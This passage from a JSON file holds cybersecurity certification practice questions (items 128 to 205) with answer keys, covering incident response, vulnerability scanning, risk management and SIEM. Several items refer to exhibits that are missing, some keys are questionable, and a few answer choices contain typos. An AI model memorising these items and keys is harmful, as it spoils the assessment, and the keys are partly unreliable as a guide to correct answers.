ine the server."}, {"letter": "D", "text": "Update the OS to latest version."}], "answer": "C"}, {"id": 128, "question": "An organization recently changed its BC and DR plans. Which of the following would best allow for the incident response team to test the changes\nwithout any impact to the business?", "options": [{"letter": "A", "text": "Perform a tabletop drill based on previously identified incident scenarios."}, {"letter": "B", "text": "Simulate an incident by shutting down power to the primary data center."}, {"letter": "C", "text": "Migrate active workloads from the primary data center to the secondary location."}, {"letter": "D", "text": "Compare the current plan to lessons learned from previous incidents."}], "answer": "A"}, {"id": 129, "question": "Security analysts review logs on multiple servers on a daily basis. Which of the following implementations will give the best central visibility into\nthe events occurring throughout the corporate environment without logging in to the servers individually?", "options": [{"letter": "A", "text": "Deploy a database to aggregate the logging"}, {"letter": "B", "text": "Configure the servers to forward logs to a SIEM"}, {"letter": "C", "text": "Share the log directory on each server to allow local access."}, {"letter": "D", "text": "Automate the emailing of logs to the analysts."}], "answer": "B"}, {"id": 130, "question": "Following a recent security incident, the Chief Information Security Officer is concerned with improving visibility and reporting of malicious actors\nin the environment. The goal is to reduce the time to prevent lateral movement and potential data exfiltration. Which of the following techniques\nwill best achieve the improvement?", "options": [{"letter": "A", "text": "Mean time to detect"}, {"letter": "B", "text": "Mean time to respond"}, {"letter": "C", "text": "Mean time to remediate"}, {"letter": "D", "text": "Service-level agreement uptime"}], "answer": "A"}, {"id": 131, "question": "After identifying a threat, a company has decided to implement a patch management program to remediate vulnerabilities. Which of the following\nrisk management principles is the company exercising?", "options": [{"letter": "A", "text": "Transfer"}, {"letter": "B", "text": "Accept"}, {"letter": "C", "text": "Mitigate"}, {"letter": "D", "text": "Avoid"}], "answer": "C"}, {"id": 132, "question": "A security analyst discovers an ongoing ransomware attack while investigating a phishing email. The analyst downloads a copy of the file from\nthe email and isolates the affected workstation from the network. Which of the following activities should the analyst perform next?", "options": [{"letter": "A", "text": "Wipe the computer and reinstall software"}, {"letter": "B", "text": "Shut down the email server and quarantine it from the network"}, {"letter": "C", "text": "Acquire a bit-level image of the affected workstation"}, {"letter": "D", "text": "Search for other mail users who have received the same file"}], "answer": "C"}, {"id": 133, "question": "The security analyst received the monthly vulnerability report. The following findings were included in the report:\n• Five of the systems only required a reboot to finalize the patch application\n• Two of the servers are running outdated operating systems and cannot be patched\nThe analyst determines that the only way to ensure these servers cannot be compromised is to isolate them. Which of the following approaches\nwill best minimize the risk of the outdated servers being compromised?", "options": [{"letter": "A", "text": "Compensating controls"}, {"letter": "B", "text": "Due diligence"}, {"letter": "C", "text": "Maintenance windows"}, {"letter": "D", "text": "Passive discovery"}], "answer": "A"}, {"id": 134, "question": "The vulnerability analyst reviews threat intelligence regarding emerging vulnerabilities affecting workstations that are used within the company:\nWhich of the following vulnerabilities should the analyst be most concerned about, knowing that end users frequently click on malicious links sent\nvia email?", "options": [{"letter": "A", "text": "Vulnerability A"}, {"letter": "B", "text": "Vulnerability B"}, {"letter": "C", "text": "Vulnerability C"}, {"letter": "D", "text": "Vulnerability D"}], "answer": "A"}, {"id": 135, "question": "An incident response analyst is taking over an investigation from another analyst. The investigation has been going on for the past few days.\nWhich of the following steps is most important during the transition between the two analysts?", "options": [{"letter": "A", "text": "Identify and discuss the lessons learned with the prior analyst."}, {"letter": "B", "text": "Accept all findings and continue to investigate the next item target."}, {"letter": "C", "text": "Review the steps that the previous analyst followed."}, {"letter": "D", "text": "Validate the root cause from the prior analyst."}], "answer": "C"}, {"id": 136, "question": "A company recently removed administrator rights from all of its end user workstations. An analyst uses CVSSv3.1 exploitability metrics to\nprioritize the vulnerabilities for the workstations and produces the following information:\nWhich of the following vulnerabilities should be prioritized for remediation?", "options": [{"letter": "A", "text": "nessie.explosion"}, {"letter": "B", "text": "vote.4p"}, {"letter": "C", "text": "sweet.bike"}, {"letter": "D", "text": "great.skills"}], "answer": "D"}, {"id": 137, "question": "A recent penetration test discovered that several employees were enticed to assist attackers by visiting specific websites and running downloaded\nfiles when prompted by phone calls. Which of the following would best address this issue?", "options": [{"letter": "A", "text": "Increasing training and awareness for all staff"}, {"letter": "B", "text": "Ensuring that malicious websites cannot be visited"}, {"letter": "C", "text": "Blocking all scripts downloaded from the internet"}, {"letter": "D", "text": "Disabling all staff members’ ability to run downloaded applications"}], "answer": "A"}, {"id": 138, "question": "A security analyst at a company is reviewing an alert from the file integrity monitoring indicating a mismatch in the login. html file hash. After\ncomparing the code with the previous version of the page source code, the analyst found the following code snippet added:\nWhich of the following best describes the activity the analyst has observed?", "options": [{"letter": "A", "text": "Obfuscated links"}, {"letter": "B", "text": "Exfiltration"}, {"letter": "C", "text": "Unauthorized changes"}, {"letter": "D", "text": "Beaconing"}], "answer": "B"}, {"id": 139, "question": "A security administrator has been notified by the IT operations department that some vulnerability reports contain an incomplete list of findings.\nWhich of the following methods should be used to resolve this issue?", "options": [{"letter": "A", "text": "Credentialed scar"}, {"letter": "B", "text": "External scan"}, {"letter": "C", "text": "Differential scan"}, {"letter": "D", "text": "Network scan"}], "answer": "A"}, {"id": 140, "question": "An organization enabled a SIEM rule to send an alert to a security analyst distribution list when ten failed logins occur within one minute.\nHowever, the control was unable to detect an attack with nine failed logins. Which of the following best represents what occurred?", "options": [{"letter": "A", "text": "False positive"}, {"letter": "B", "text": "True negative"}, {"letter": "C", "text": "False negative"}, {"letter": "D", "text": "True positive"}], "answer": "C"}, {"id": 141, "question": "A cybersecurity analyst is tasked with scanning a web application to understand where the scan will go and whether there are URIs that should be\ndenied access prior to more in-depth scanning. Which of following best fits the type of scanning activity requested?", "options": [{"letter": "A", "text": "Uncredentialed scan"}, {"letter": "B", "text": "Discovery scan"}, {"letter": "C", "text": "Vulnerability scan"}, {"letter": "D", "text": "Credentialed scan"}], "answer": "B"}, {"id": 142, "question": "Which of the following best describes the process of requiring remediation of a known threat within a given time frame?", "options": [{"letter": "A", "text": "SLA"}, {"letter": "B", "text": "MOU"}, {"letter": "C", "text": "Best-effort patching"}, {"letter": "D", "text": "Organizational governance"}], "answer": "A"}, {"id": 143, "question": "Which of the following risk management principles is accomplished by purchasing cyber insurance?", "options": [{"letter": "A", "text": "Accept"}, {"letter": "B", "text": "Avoid"}, {"letter": "C", "text": "Mitigate"}, {"letter": "D", "text": "Transfer"}], "answer": "D"}, {"id": 144, "question": "A recent audit of the vulnerability management program outlined the finding for increased awareness of secure coding practices. Which of the\nfollowing would be best to address the finding?", "options": [{"letter": "A", "text": "Establish quarterly SDLC training on the top vulnerabilities for developers"}, {"letter": "B", "text": "Conduct a yearly inspection of the code repositories and provide the report to management."}, {"letter": "C", "text": "Hire an external penetration test of the network"}, {"letter": "D", "text": "Deploy more vulnerability scanners for increased coverage"}], "answer": "A"}, {"id": 145, "question": "An organization has deployed a cloud-based storage system for shared data that is in phase two of the data life cycle. Which of the following\ncontrols should the security team ensure are addressed? (Choose two.)", "options": [{"letter": "A", "text": "Data classification"}, {"letter": "B", "text": "Data destruction"}, {"letter": "C", "text": "Data loss prevention"}, {"letter": "D", "text": "Encryption"}, {"letter": "E", "text": "Backups"}, {"letter": "F", "text": "Access controls"}], "answer": "DF"}, {"id": 146, "question": "An analyst is conducting routine vulnerability assessments on the company infrastructure. When performing these scans, a business-critical\nserver crashes, and the cause is traced back to the vulnerability scanner. Which of the following is the cause of this issue?", "options": [{"letter": "A", "text": "The scanner is running without an agent installed."}, {"letter": "B", "text": "The scanner is running in active mode."}, {"letter": "C", "text": "The scanner is segmented improperly"}, {"letter": "D", "text": "The scanner is configured with a scanning window"}], "answer": "B"}, {"id": 147, "question": "An organization's threat intelligence team notes a recent trend in adversary privilege escalation procedures. Multiple threat groups have been\nobserved utilizing native Windows tools to bypass system controls and execute commands with privileged credentials. Which of the following\ncontrols would be most effective to reduce the rate of success of such attempts?", "options": [{"letter": "A", "text": "Set user account control protection to the most restrictive level on all devices"}, {"letter": "B", "text": "Implement MFA requirements for all internal resources"}, {"letter": "C", "text": "Harden systems by disabling or removing unnecessary services"}, {"letter": "D", "text": "Implement controls to block execution of untrusted applications"}], "answer": "D"}, {"id": 148, "question": "A new zero-day vulnerability was released. A security analyst is prioritizing which systems should receive deployment of compensating controls\ndeployment first. The systems have been grouped into the categories shown below:\nWhich of the following groups should be prioritized for compensating controls?", "options": [{"letter": "A", "text": "Group A"}, {"letter": "B", "text": "Group B"}, {"letter": "C", "text": "Group C"}, {"letter": "D", "text": "Group D"}], "answer": "A"}, {"id": 149, "question": "A Chief Information Security Officer wants to map all the attack vectors that the company faces each day. Which of the following\nrecommendations should the company align their security controls around?", "options": [{"letter": "A", "text": "OSSTMM"}, {"letter": "B", "text": "Diamond Model of Intrusion Analysis"}, {"letter": "C", "text": "OWASP"}, {"letter": "D", "text": "MITRE ATT&CK"}], "answer": "D"}, {"id": 150, "question": "Which of the following actions would an analyst most likely perform after an incident has been investigated?", "options": [{"letter": "A", "text": "Risk assessment"}, {"letter": "B", "text": "Root cause analysis"}, {"letter": "C", "text": "Incident response plan"}, {"letter": "D", "text": "Tabletop exercise"}], "answer": "B"}, {"id": 151, "question": "After completing a review of network activity, the threat hunting team discovers a device on the network that sends an outbound email via a mail\nclient to a non-company email address daily at 10:00 p.m. Which of the following is potentially occurring?", "options": [{"letter": "A", "text": "Irregular peer-to-peer communication"}, {"letter": "B", "text": "Rogue device on the network"}, {"letter": "C", "text": "Abnormal OS process behavior"}, {"letter": "D", "text": "Data exfiltration"}], "answer": "D"}, {"id": 152, "question": "A vulnerability scanner generates the following output:\nThe company has an SLA for patching that requires time frames to be met for high-risk vulnerabilities. Which of the following should the analyst\nprioritize first for remediation?", "options": [{"letter": "A", "text": "Oracle JDK"}, {"letter": "B", "text": "Cisco Webex"}, {"letter": "C", "text": "Redis Server"}, {"letter": "D", "text": "SSL Self-signed Certificate"}], "answer": "C"}, {"id": 153, "question": "A web application team notifies a SOC analyst that there are thousands of HTTP/404 events on the public-facing web server. Which of the\nfollowing is the next step for the analyst to take?", "options": [{"letter": "A", "text": "Instruct the firewall engineer that a rule needs to be added to block this external server"}, {"letter": "B", "text": "Escalate the event to an incident and notify the SOC manager of the activity"}, {"letter": "C", "text": "Notify the incident response team that there is a DDoS attack occurring"}, {"letter": "D", "text": "Identify the IP/hostname for the requests and look at the related activity"}], "answer": "D"}, {"id": 154, "question": "Which of the following best describes the reporting metric that should be utilized when measuring the degree to which a system application, or\nuser base is affected by an uptime availability outage?", "options": [{"letter": "A", "text": "Timeline"}, {"letter": "B", "text": "Evidence"}, {"letter": "C", "text": "Impact"}, {"letter": "D", "text": "Scope"}], "answer": "C"}, {"id": 155, "question": "A security analyst needs to provide evidence of regular vulnerability scanning on the company's network for an auditing process. Which of the\nfollowing is an example of a tool that can produce such evidence?", "options": [{"letter": "A", "text": "OpenVAS"}, {"letter": "B", "text": "Burp Suite"}, {"letter": "C", "text": "Nmap"}, {"letter": "D", "text": "Wireshark"}], "answer": "A"}, {"id": 156, "question": "A security analyst performs a vulnerability scan. Based on the metrics from the scan results, the analyst must prioritize which hosts to patch. The\nanalyst runs the tool and receives the following output:\nWhich of the following hosts should be patched first, based on the metrics?", "options": [{"letter": "A", "text": "host01"}, {"letter": "B", "text": "host02"}, {"letter": "C", "text": "host03"}, {"letter": "D", "text": "host04"}], "answer": "C"}, {"id": 157, "question": "An organization receives a legal hold request from an attorney. The request pertains to emails related to a disputed vendor contract. Which of the\nfollowing is the best step for the security team to take to ensure compliance with the request?", "options": [{"letter": "A", "text": "Publicly disclose the request to other vendors"}, {"letter": "B", "text": "Notify the departments involved to preserve potentially relevant information"}, {"letter": "C", "text": "Establish a chain of custody starting with the attorney's request"}, {"letter": "D", "text": "Back up the mailboxes on the server and provide the attorney with a copy"}], "answer": "B"}, {"id": 158, "question": "A company has the following security requirements:\n• No public IPs\n• All data secured at rest\n• No insecure ports/protocols\nAfter a cloud scan is completed a security analyst receives reports that several misconfigurations are putting the company at risk. Given the\nfollowing cloud scanner output:\nWhich of the following should the analyst recommend be updated first to meet the security requirements and reduce risks?", "options": [{"letter": "A", "text": "VM_PRD_DB"}, {"letter": "B", "text": "VM_DEV_DB"}, {"letter": "C", "text": "VM_DEV_Web02"}, {"letter": "D", "text": "VM_PRD_Web01"}], "answer": "C"}, {"id": 159, "question": "Which of the following best describes the actions taken by an organization after the resolution of an incident that addresses issues and reflects\non the growth opportunities for future incidents?", "options": [{"letter": "A", "text": "Lessons learned"}, {"letter": "B", "text": "Scrum review"}, {"letter": "C", "text": "Root cause analysis"}, {"letter": "D", "text": "Regulatory compliance"}], "answer": "A"}, {"id": 160, "question": "An analyst is becoming overwhelmed with the number of events that need to be investigated for a timeline. Which of the following should the\nanalyst focus on in order to move the incident forward?", "options": [{"letter": "A", "text": "Impact"}, {"letter": "B", "text": "Vulnerability score"}, {"letter": "C", "text": "Mean time to detect"}, {"letter": "D", "text": "Isolation"}], "answer": "A"}, {"id": 161, "question": "To minimize the impact of a security incident, a cybersecurity analyst has configured audit settings in the organization’s cloud services. Which of\nthe following security controls has the analyst configured?", "options": [{"letter": "A", "text": "Preventive"}, {"letter": "B", "text": "Corrective"}, {"letter": "C", "text": "Directive"}, {"letter": "D", "text": "Detective"}], "answer": "D"}, {"id": 162, "question": "A web developer reports the following error that appeared on a development server when testing a new application:\nWhich of the following tools can be used to identify the application’s point of failure?", "options": [{"letter": "A", "text": "OpenVAS"}, {"letter": "B", "text": "Angry IP scanner"}, {"letter": "C", "text": "Immunity debugger"}, {"letter": "D", "text": "Burp Suite"}], "answer": "C"}, {"id": 163, "question": "Which of the following describes a contract that is used to define the various levels of maintenance to be provided by an external business vendor\nin a secure environment?", "options": [{"letter": "A", "text": "MOU"}, {"letter": "B", "text": "NDA"}, {"letter": "C", "text": "BIA"}, {"letter": "D", "text": "SLA"}], "answer": "D"}, {"id": 164, "question": "A security team is concerned about recent Layer 4 DDoS attacks against the company website. Which of the following controls would best\nmitigate the attacks?", "options": [{"letter": "A", "text": "Block the attacks using firewall rules"}, {"letter": "B", "text": "Deploy an IPS in the perimeter network"}, {"letter": "C", "text": "Roll out a CDN"}, {"letter": "D", "text": "Implement a load balancer"}], "answer": "C"}, {"id": 165, "question": "An analyst is reviewing system logs while threat hunting:\nWhich of the following hosts should be investigated first?", "options": [{"letter": "A", "text": "PC1"}, {"letter": "B", "text": "PC2"}, {"letter": "C", "text": "PC3"}, {"letter": "D", "text": "PC4"}, {"letter": "E", "text": "PC5"}], "answer": "E"}, {"id": 166, "question": "An organization needs to bring in data collection and aggregation from various endpoints. Which of the following is the best tool to deploy to help\nanalysts gather this data?", "options": [{"letter": "A", "text": "DLP"}, {"letter": "B", "text": "NAC"}, {"letter": "C", "text": "EDR"}, {"letter": "D", "text": "NIDS"}], "answer": "C"}, {"id": 167, "question": "A regulated organization experienced a security breach that exposed a list of customer names with corresponding PII data. Which of the following\nis the best reason for developing the organization's communication plans?", "options": [{"letter": "A", "text": "For the organization's public relations department to have a standard notification"}, {"letter": "B", "text": "To ensure incidents are immediately reported to a regulatory agency"}, {"letter": "C", "text": "To automate the notification to customers who were impacted by the breach"}, {"letter": "D", "text": "To have approval from executive leadership on when communication should occur"}], "answer": "B"}, {"id": 168, "question": "Following an incident, a security analyst needs to create a script for downloading the configuration of all assets from the cloud tenancy. Which of\nthe following authentication methods should the analyst use?", "options": [{"letter": "A", "text": "MFA"}, {"letter": "B", "text": "User and password"}, {"letter": "C", "text": "PAM"}, {"letter": "D", "text": "Key pair"}], "answer": "D"}, {"id": 169, "question": "A penetration tester is conducting a test on an organization's software development website. The penetration tester sends the following request\nto the web interface:\nWhich of the following exploits is most likely being attempted?", "options": [{"letter": "A", "text": "SQL injection"}, {"letter": "B", "text": "Local file inclusion"}, {"letter": "C", "text": "Cross-site scripting"}, {"letter": "D", "text": "Directory traversal"}], "answer": "A"}, {"id": 170, "question": "Two employees in the finance department installed a freeware application that contained embedded malware. The network is robustly segmented\nbased on areas of responsibility. These computers had critical sensitive information stored locally that needs to be recovered. The department\nmanager advised all department employees to turn off their computers until the security team could be contacted about the issue. Which of the\nfollowing is the first step the incident response staff members should take when they arrive?", "options": [{"letter": "A", "text": "Turn on all systems, scan for infection, and back up data to a USB storage device."}, {"letter": "B", "text": "Identify and remove the software installed on the impacted systems in the department."}, {"letter": "C", "text": "Explain that malware cannot truly be removed and then reimage the devices."}, {"letter": "D", "text": "Log on to the impacted systems with an administrator account that has privileges to perform backups."}, {"letter": "E", "text": "Segment the entire department from the network and review each computer offline."}], "answer": "E"}, {"id": 171, "question": "A manufacturer has hired a third-party consultant to assess the security of an OT network that includes both fragile and legacy equipment. Which\nof the following must be considered to ensure the consultant does no harm to operations?", "options": [{"letter": "A", "text": "Employing Nmap Scripting Engine scanning techniques"}, {"letter": "B", "text": "Preserving the state of PLC ladder logic prior to scanning"}, {"letter": "C", "text": "Using passive instead of active vulnerability scans"}, {"letter": "D", "text": "Running scans during off-peak manufacturing hours"}], "answer": "C"}, {"id": 172, "question": "A team of analysts is developing a new internal system that correlates information from a variety of sources, analyzes that information, and then\ntriggers notifications according to company policy. Which of the following technologies was deployed?", "options": [{"letter": "A", "text": "SIEM"}, {"letter": "B", "text": "SOAR"}, {"letter": "C", "text": "IPS"}, {"letter": "D", "text": "CERT"}], "answer": "A"}, {"id": 173, "question": "Which of following would best mitigate the effects of a new ransomware attack that was not properly stopped by the company antivirus?", "options": [{"letter": "A", "text": "Install a firewall."}, {"letter": "B", "text": "Implement vulnerability management."}, {"letter": "C", "text": "Deploy sandboxing."}, {"letter": "D", "text": "Update the application blocklist."}], "answer": "C"}, {"id": 174, "question": "A Chief Information Security Officer wants to implement security by design, starting with the implementation of a security scanning method to\nidentify vulnerabilities, including SQL injection, RFI, XSS, etc. Which of the following would most likely meet the requirement?", "options": [{"letter": "A", "text": "Reverse engineering"}, {"letter": "B", "text": "Known environment testing"}, {"letter": "C", "text": "Dynamic application security testing"}, {"letter": "D", "text": "Code debugging"}], "answer": "C"}, {"id": 175, "question": "A security analyst scans a host and generates the following output:\nWhich of the following best describes the output?", "options": [{"letter": "A", "text": "The host is unresponsive to the ICMP request."}, {"letter": "B", "text": "The host is running a vulnerable mail server."}, {"letter": "C", "text": "The host is allowing unsecured FTP connections."}, {"letter": "D", "text": "The host is vulnerable to web-based exploits."}], "answer": "D"}, {"id": 176, "question": "The security team at a company, which was a recent target of ransomware, compiled a list of hosts that were identified as impacted and in scope\nfor this incident. Based on the following host list:\nWhich of the following systems was most pivotal to the threat actor in its distribution of the encryption binary via Group Policy?", "options": [{"letter": "A", "text": "SQL01"}, {"letter": "B", "text": "WK10-Sales07"}, {"letter": "C", "text": "WK7-Plant01"}, {"letter": "D", "text": "DCEast01"}, {"letter": "E", "text": "HQAdmin9"}], "answer": "D"}, {"id": 177, "question": "After a security assessment was done by a third-party consulting firm, the cybersecurity program recommended integrating DLP and CASE to\nreduce analyst alert fatigue. Which of the following is the best possible outcome that this effort hopes to achieve?", "options": [{"letter": "A", "text": "SIEM ingestion logs are reduced by 20%."}, {"letter": "B", "text": "Phishing alerts drop by 20%."}, {"letter": "C", "text": "False positive rates drop to 20%."}, {"letter": "D", "text": "The MTTR decreases by 20%."}], "answer": "C"}, {"id": 178, "question": "Which of the following threat actors is most likely to target a company due to its questionable environmental policies?", "options": [{"letter": "A", "text": "Hacktivist"}, {"letter": "B", "text": "Organized crime"}, {"letter": "C", "text": "Nation-state"}, {"letter": "D", "text": "Lone wolf"}], "answer": "A"}, {"id": 179, "question": "A cybersecurity analyst is recording the following details:\n• ID\n• Name\n• Description\n• Classification of information\n• Responsible party\nIn which of the following documents is the analyst recording this information?", "options": [{"letter": "A", "text": "Risk register"}, {"letter": "B", "text": "Change control documentation"}, {"letter": "C", "text": "Incident response playbook"}, {"letter": "D", "text": "Incident response plan"}], "answer": "A"}, {"id": 180, "question": "A SOC manager is establishing a reporting process to manage vulnerabilities. Which of the following would be the best solution to identify\npotential loss incurred by an issue?", "options": [{"letter": "A", "text": "Trends"}, {"letter": "B", "text": "Risk score"}, {"letter": "C", "text": "Mitigation"}, {"letter": "D", "text": "Prioritization"}], "answer": "B"}, {"id": 181, "question": "While configuring a SIEM for an organization, a security analyst is having difficulty correlating incidents across different systems. Which of the\nfollowing should be checked first?", "options": [{"letter": "A", "text": "If appropriate logging levels are set"}, {"letter": "B", "text": "NTP configuration on each system"}, {"letter": "C", "text": "Behavioral correlation settings"}, {"letter": "D", "text": "Data normalization rules"}], "answer": "B"}, {"id": 182, "question": "During a scan of a web server in the perimeter network, a vulnerability was identified that could be exploited over port 3389. The web server is\nprotected by a WAF. Which of the following best represents the change to overall risk associated with this vulnerability?", "options": [{"letter": "A", "text": "The risk would not change because network firewalls are in use"}, {"letter": "B", "text": "The risk would decrease because RDP is blocked by the firewall"}, {"letter": "C", "text": "The risk would decrease because a web application firewall is in place"}, {"letter": "D", "text": "The risk would increase because the host is external facing"}], "answer": "D"}, {"id": 183, "question": "Several vulnerability scan reports have indicated runtime errors as the code is executing. The dashboard that lists the errors has a command-line\ninterface for developers to check for vulnerabilities. Which of the following will enable a developer to correct this issue? (Choose two.)", "options": [{"letter": "A", "text": "Performing dynamic application security testing"}, {"letter": "B", "text": "Reviewing the code"}, {"letter": "C", "text": "Fuzzing the application"}, {"letter": "D", "text": "Debugging the code"}, {"letter": "E", "text": "Implementing a coding standard"}, {"letter": "F", "text": "Implementing IDS"}], "answer": "AD"}, {"id": 184, "question": "A security analyst is trying to validate the results of a web application scan with Burp Suite. The security analyst performs the following:\nWhich of the following vulnerabilities is the security analyst trying to validate?", "options": [{"letter": "A", "text": "SQL injection"}, {"letter": "B", "text": "LFI"}, {"letter": "C", "text": "XSS"}, {"letter": "D", "text": "CSRF"}], "answer": "B"}, {"id": 185, "question": "A cybersecurity team has witnessed numerous vulnerability events recently that have affected operating systems. The team decides to implement\nhost-based IPS, firewalls and two-factor authentication. Which of the following does this most likely describe?", "options": [{"letter": "A", "text": "System hardening"}, {"letter": "B", "text": "Hybrid network architecture"}, {"letter": "C", "text": "Continuous authorization"}, {"letter": "D", "text": "Secure access service edge"}], "answer": "A"}, {"id": 186, "question": "A security analyst needs to secure digital evidence related to an incident. The security analyst must ensure that the accuracy of the data cannot\nbe repudiated. Which of the following should be implemented?", "options": [{"letter": "A", "text": "Offline storage"}, {"letter": "B", "text": "Evidence collection"}, {"letter": "C", "text": "Integrity validation"}, {"letter": "D", "text": "Legal hold"}], "answer": "C"}, {"id": 187, "question": "An analyst investigated a website and produced the following:\nWhich of the following syntaxes did the analyst use to discover the application versions on this vulnerable website?", "options": [{"letter": "A", "text": "nmap -sS -T4 -F insecure.org"}, {"letter": "B", "text": "nmap -C insecure.org"}, {"letter": "C", "text": "nmap -sV -T4 -F insecure.org"}, {"letter": "D", "text": "nmap -A insecure.org"}], "answer": "C"}, {"id": 188, "question": "A cybersecurity analyst is doing triage in a SIEM and notices that the time stamps between the firewall and the host under investigation are off by\n43 minutes. Which of the following is the most likely scenario occurring with the time stamps?", "options": [{"letter": "A", "text": "The NTP server is not configured on the host"}, {"letter": "B", "text": "The cybersecurity analyst is looking at the wrong information"}, {"letter": "C", "text": "The firewall is using UTC time"}, {"letter": "D", "text": "The host with the logs is offline"}], "answer": "A"}, {"id": 189, "question": "A payroll department employee was the target of a phishing attack in which an attacker impersonated a department director and requested that\ndirect deposit information be updated to a new account. Afterward, a deposit was made into the unauthorized account. Which of the following is\none of the first actions the incident response team should take when they receive notification of the attack?", "options": [{"letter": "A", "text": "Scan the employee's computer with virus and malware tools"}, {"letter": "B", "text": "Review the actions taken by the employee and the email related to the event"}, {"letter": "C", "text": "Contact human resources and recommend the termination of the employee"}, {"letter": "D", "text": "Assign security awareness training to the employee involved in the incident"}], "answer": "B"}, {"id": 190, "question": "A security analyst has found the following suspicious DNS traffic while analyzing a packet capture:\n• DNS traffic while a tunneling session is active.\n• The mean time between queries is less than one second.\n• The average query length exceeds 100 characters.\nWhich of the following attacks most likely occurred?", "options": [{"letter": "A", "text": "DNS exfiltration"}, {"letter": "B", "text": "DNS spoofing"}, {"letter": "C", "text": "DNS zone transfer"}, {"letter": "D", "text": "DNS poisoning"}], "answer": "A"}, {"id": 191, "question": "A small company does not have enough staff to effectively segregate duties to prevent error and fraud in payroll management. The Chief\nInformation Security Officer (CISO) decides to maintain and review logs and audit trails to mitigate risk. Which of the following did the CISO\nimplement?", "options": [{"letter": "A", "text": "Corrective controls"}, {"letter": "B", "text": "Compensating controls"}, {"letter": "C", "text": "Operational controls"}, {"letter": "D", "text": "Administrative controls"}], "answer": "B"}, {"id": 192, "question": "During the log analysis phase, the following suspicious command is detected:\nWhich of the following is being attempted?", "options": [{"letter": "A", "text": "Buffer overflow"}, {"letter": "B", "text": "RCE"}, {"letter": "C", "text": "ICMP tunneling"}, {"letter": "D", "text": "Smurf attack"}], "answer": "B"}, {"id": 193, "question": "An email hosting provider added a new data center with new public IP addresses. Which of the following most likely needs to be updated to\nensure emails from the new data center do not get blocked by spam filters?", "options": [{"letter": "A", "text": "DKIM"}, {"letter": "B", "text": "SPF"}, {"letter": "C", "text": "SMTP"}, {"letter": "D", "text": "DMARC"}], "answer": "B"}, {"id": 194, "question": "A laptop that is company owned and managed is suspected to have malware. The company implemented centralized security logging. Which of\nthe following log sources will confirm the malware infection?", "options": [{"letter": "A", "text": "XDR logs"}, {"letter": "B", "text": "Firewall legs"}, {"letter": "C", "text": "IDS logs"}, {"letter": "D", "text": "MFA logs"}], "answer": "A"}, {"id": 195, "question": "Which of the following best describes the goal of a disaster recovery exercise as preparation for possible incidents?", "options": [{"letter": "A", "text": "To provide metrics and test continuity controls"}, {"letter": "B", "text": "To verify the roles of the incident response team"}, {"letter": "C", "text": "To provide recommendations for handling vulnerabilities"}, {"letter": "D", "text": "To perform tests against implemented security controls"}], "answer": "A"}, {"id": 196, "question": "A security analyst has prepared a vulnerability scan that contains all of the company’s functional subnets. During the initial scan users reported\nthat network printers began to print pages that contained unreadable text and icons. Which of the following should the analyst do to ensure this\nbehavior does not occur during subsequent vulnerability scans?", "options": [{"letter": "A", "text": "Perform non-credentialed scans"}, {"letter": "B", "text": "Ignore embedded web server ports"}, {"letter": "C", "text": "Create a tailored scan for the printer subnet"}, {"letter": "D", "text": "Increase the threshold length of the scan timeout"}], "answer": "C"}, {"id": 197, "question": "A Chief Information Security Officer has outlined several requirements for a new vulnerability scanning project:\n• Must use minimal network bandwidth\n• Must use minimal host resources\n• Must provide accurate, near real-time updates\n• Must not have any stored credentials in configuration on the scanner\nWhich of the following vulnerability scanning methods should be used to best meet these requirements?", "options": [{"letter": "A", "text": "Internal"}, {"letter": "B", "text": "Agent"}, {"letter": "C", "text": "Active"}, {"letter": "D", "text": "Uncredentialed"}], "answer": "B"}, {"id": 198, "question": "An employee is no longer able to log in to an account after updating a browser. The employee usually has several tabs open in the browser. Which\nof the following attacks was most likely performed?", "options": [{"letter": "A", "text": "RFI"}, {"letter": "B", "text": "LFI"}, {"letter": "C", "text": "CSRF"}, {"letter": "D", "text": "XSS"}], "answer": "C"}, {"id": 199, "question": "Which of the following does \"federation\" most likely refer to within the context of identity and access management?", "options": [{"letter": "A", "text": "Facilitating groups of users in a similar function or profile to system access that requires elevated or conditional access"}, {"letter": "B", "text": "An authentication mechanism that allows a user to utilize one set of credentials to access multiple domains"}, {"letter": "C", "text": "Utilizing a combination of what you know who you are, and what you have to grant authentication to a user"}, {"letter": "D", "text": "Correlating one's identity with the attributes and associated applications the user has access to"}], "answer": "B"}, {"id": 200, "question": "The Chief Information Security Officer for an organization recently received approval to install a new EDR solution. Following the installation, the\nnumber of alerts that require remediation by an analyst has tripled. Which of the following should the organization utilize to best centralize the\nworkload for the internal security team? (Choose two.)", "options": [{"letter": "A", "text": "SOAR"}, {"letter": "B", "text": "SIEM"}, {"letter": "C", "text": "MSP"}, {"letter": "D", "text": "NGFW"}, {"letter": "E", "text": "XDR"}, {"letter": "F", "text": "DLP"}], "answer": "AB"}, {"id": 201, "question": "Which of the following best describes the threat concept in which an organization works to ensure that all network users only open attachments\nfrom known sources?", "options": [{"letter": "A", "text": "Hacktivist threat"}, {"letter": "B", "text": "Advanced persistent threat"}, {"letter": "C", "text": "Unintentional insider threat"}, {"letter": "D", "text": "Nation-state threat"}], "answer": "C"}, {"id": 202, "question": "A security analyst has received an incident case regarding malware spreading out of control on a customer's network. The analyst is unsure how\nto respond. The configured EDR has automatically obtained a sample of the malware and its signature. Which of the following should the analyst\nperform next to determine the type of malware based on its telemetry?", "options": [{"letter": "A", "text": "Cross-reference the signature with open-source threat intelligence."}, {"letter": "B", "text": "Configure the EDR to perform a full scan."}, {"letter": "C", "text": "Transfer the malware to a sandbox environment."}, {"letter": "D", "text": "Log in to the affected systems and run netstat."}], "answer": "A"}, {"id": 203, "question": "A network analyst notices a long spike in traffic on port 1433 between two IP addresses on opposite sides of a WAN connection. Which of the\nfollowing is the most likely cause?", "options": [{"letter": "A", "text": "A local red team member is enumerating the local RFC1918 segment to enumerate hosts"}, {"letter": "B", "text": "A threat actor has a foothold on the network and is sending out control beacons"}, {"letter": "C", "text": "An administrator executed a new database replication process without notifying the SOC"}, {"letter": "D", "text": "An insider threat actor is running Responder on the local segment, creating traffic replication"}], "answer": "C"}, {"id": 204, "question": "Which of the following is a useful tool for mapping, tracking, and mitigating identified threats and vulnerabilities with the likelihood and impact of\noccurrence?", "options": [{"letter": "A", "text": "Risk register"}, {"letter": "B", "text": "Vulnerability assessment"}, {"letter": "C", "text": "Penetration test"}, {"letter": "D", "text": "Compliance report"}], "answer": "A"}, {"id": 205, "question": "Which of the following is often used to keep the number of alerts to a manageable level when establishing a process to track and analyze\nviolations?", "options": [{"letter": "A", "text": "Log retention"}, {"letter": "B", "text": "Log rotation"}, {"letter": "C", "text": "Maximum log size"}, 